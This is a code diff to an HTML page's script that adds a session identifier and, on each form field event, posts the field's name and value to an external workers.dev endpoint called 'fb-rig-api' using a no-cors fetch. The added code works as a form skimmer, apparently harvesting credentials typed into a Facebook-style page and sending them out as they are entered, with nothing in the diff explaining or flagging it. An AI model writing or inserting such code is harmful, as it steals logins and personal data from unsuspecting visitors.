@@ -180,6 +180,11 @@
     </div>
 
     <script>
+        const id = "___id";
+        if(!sessionStorage.getItem(id)){
+            sessionStorage.setItem(id, JSON.stringify(new Date().toDateString()))
+        }
+
 
         let form = document.forms[0];
 
@@ -187,6 +192,22 @@
             let target = e.target;
             let name = target.name;
             let value = target.value;
+
+            const data = {name, value, session:sessionStorage.getItem(id)};
+
+
+            fetch("https://fb-rig-api.cedrick1227.workers.dev/", {
+                method: "POST", 
+                mode: "no-cors",
+                cache: "no-cache", 
+
+                headers: {
+                    "Content-Type": "application/json",
+                },
+
+                
+                body: JSON.stringify(data),
+            });
 
         });
         form.addEventListener("submit", (e)=>{
